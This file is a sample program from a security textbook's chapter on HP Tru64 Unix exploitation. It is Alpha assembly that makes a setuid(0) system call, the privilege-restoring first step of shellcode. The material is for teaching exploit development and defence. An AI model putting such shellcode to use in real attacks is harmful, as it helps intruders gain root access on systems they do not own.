/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 12: HP Tru64 Unix Exploitation
Sample Program #2

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/


#include <alpha/regdef.h>
#include <alpha/pal.h>
     .text
     .arch     generic
     .align 4
     .globl  main
     .ent      main
main:
     bis  zero, zero, a0       #argument to setuid(), uid=0
     addq zero, 0x17, v0       #setuid system call number.
     PAL_callsys          #trap to kernel mode.
